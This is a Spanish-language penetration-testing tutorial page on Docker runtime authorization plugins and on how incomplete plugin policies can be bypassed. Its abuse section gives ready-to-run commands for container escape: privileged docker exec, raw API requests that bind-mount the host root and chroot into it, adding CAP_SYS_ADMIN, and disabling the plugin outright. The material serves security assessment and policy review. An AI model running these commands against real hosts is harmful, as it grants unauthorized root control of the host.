# Plugins de autorización en tiempo de ejecución

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Los plugins de autorización en tiempo de ejecución son una capa adicional de políticas que decide si un solicitante puede realizar una acción determinada en el daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el Docker daemon tiene, de facto, un control amplio sobre él. Los plugins de autorización intentan estrechar ese modelo examinando el usuario autenticado y la operación API solicitada, y permitiendo o denegando la petición según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una API de Docker o a un usuario en el grupo `docker`. En esos entornos la pregunta ya no es solo "¿puedo llegar al daemon?" sino también "¿está el daemon protegido por una capa de autorización y, de ser así, puede esa capa ser bypassed a través de endpoints sin manejar, parsing JSON débil o permisos de gestión de plugins?"

## Operación

Cuando una petición llega al Docker daemon, el subsistema de autorización puede pasar el contexto de la petición a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la petición, cabeceras seleccionadas y partes del body de la petición o respuesta cuando el content type es adecuado. Se pueden encadenar múltiples plugins, y el acceso solo se concede si todos los plugins permiten la petición.

Este modelo parece robusto, pero su seguridad depende completamente de cuánto entendió el autor de la política la API. Un plugin que bloquee `docker run --privileged` pero ignore `docker exec`, pase por alto claves JSON alternativas como el top-level `Binds`, o permita la administración de plugins puede crear una falsa sensación de restricción mientras sigue dejando rutas directas de escalado de privilegios abiertas.

## Objetivos comunes de los plugins

Áreas importantes para la revisión de la política son:

- endpoints de creación de contenedores
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, y opciones de compartición de namespaces
- comportamiento de `docker exec`
- endpoints de gestión de plugins
- cualquier endpoint que pueda desencadenar indirectamente acciones en tiempo de ejecución fuera del modelo de política previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaron el estudio de este modelo porque sus archivos de política y rutas de código mostraban cómo se implementaba realmente el mapeo endpoint-a-acción. Para trabajos de assessment, la lección importante es que el autor de la política debe entender la superficie completa de la API en lugar de solo los comandos CLI más visibles.

## Abuso

El primer objetivo es aprender qué está realmente bloqueado. Si el daemon deniega una acción, el error a menudo leak el nombre del plugin, lo que ayuda a identificar el control en uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea repetitiva de comprobar qué rutas de la API y qué estructuras JSON están realmente permitidas por el plugin.

Si el entorno utiliza un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos están realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones importan porque muchas fallas de autorización son específicas de campo en lugar de concepto. Un plugin puede rechazar un patrón de CLI sin bloquear completamente la estructura equivalente de la API.

### Ejemplo completo: `docker exec` añade privilegios después de la creación del contenedor

Una política que bloquea la creación de contenedores con privilegios pero permite la creación de contenedores no confinados más `docker exec` aún puede ser eludida:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si el daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo privilegiado dentro de un contenedor que el autor de la política creía que estaba restringido.

### Full Example: Bind Mount Through Raw API

Algunas políticas defectuosas inspeccionan solo una forma JSON. Si el bind mount del sistema de archivos raíz no se bloquea de forma consistente, el host aún puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer bajo `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo del sistema de archivos del host. El detalle interesante es que el bypass se debe a una cobertura de políticas incompleta en lugar de a un bug del kernel.

### Ejemplo completo: Atributo 'capability' sin verificar

Si la política olvida filtrar un atributo relacionado con capability, el atacante puede crear un contenedor que recupere una capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` u otra capability igualmente potente esté presente, muchas técnicas de breakout descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) se vuelven alcanzables.

### Ejemplo completo: Deshabilitar el plugin

Si las operaciones de gestión de plugins están permitidas, el bypass más limpio puede ser desactivar el control por completo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Esto es una falla de la política a nivel del plano de control. La capa de autorización existe, pero el usuario al que se suponía que debía restringirla todavía conserva permiso para desactivarla.

## Comprobaciones

Estos comandos están dirigidos a identificar si existe una capa de políticas y si parece ser completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Lo interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para descubrir si es posible deshabilitar o reconfigurar.
- Una política que bloquea solo las acciones obvias de la CLI pero no las peticiones API en bruto debe considerarse susceptible de bypass hasta que se demuestre lo contrario.

## Valores predeterminados en tiempo de ejecución

| Runtime / platform | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | El acceso al daemon es efectivamente todo o nada a menos que se configure un plugin de autorización | política de plugin incompleta, listas negras en lugar de allowlists, permitir la gestión de plugins, puntos ciegos a nivel de campo |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exponer ampliamente una API de Podman con root, permisos de socket débiles |
| containerd / CRI-O | Different control model | Estos runtimes suelen depender de permisos de socket, límites de confianza del nodo y controles del orquestador en capas superiores en lugar de Docker authz plugins | montar el socket en workloads, suposiciones débiles de confianza local del nodo |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC y controles de admisión son la capa principal de políticas | RBAC demasiado amplio, política de admisión débil, exponer directamente kubelet o runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
